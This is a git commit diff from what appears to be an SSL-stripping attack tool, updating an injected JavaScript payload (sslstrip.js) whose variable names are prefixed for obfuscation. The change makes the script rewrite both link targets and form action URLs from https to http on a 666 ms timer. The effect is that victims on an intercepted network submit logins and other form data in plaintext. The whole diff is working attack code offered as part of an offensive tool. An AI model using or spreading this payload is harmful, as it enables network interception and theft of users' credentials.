3e41f9d8f77938448276e54bc5500b74a0caefaf
yungtravla <lilprismontour@gmail.com>
2018-10-20 17:16:34 +1000

    sslstrip hosts in form submissions

--- hstshijack/payloads/sslstrip.js
+++ hstshijack/payloads/sslstrip.js
@@ -5,7 +5,7 @@ XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_as
 }
 
 setInterval(function(){
-	document.querySelectorAll("a").forEach(function(obf_a){
-		obf_a.href = obf_a.href.replace(/^(http)s/ig, "http")
+	document.querySelectorAll("a, form").forEach(function(obf_var_node){
+		obf_var_node.tagName == "A" ? obf_var_node.href = obf_var_node.href.replace(/^(http)s/ig, "$1") : obf_var_node.action = obf_var_node.action.replace(/^(http)s/ig, "$1")
 	})
 }, 666)
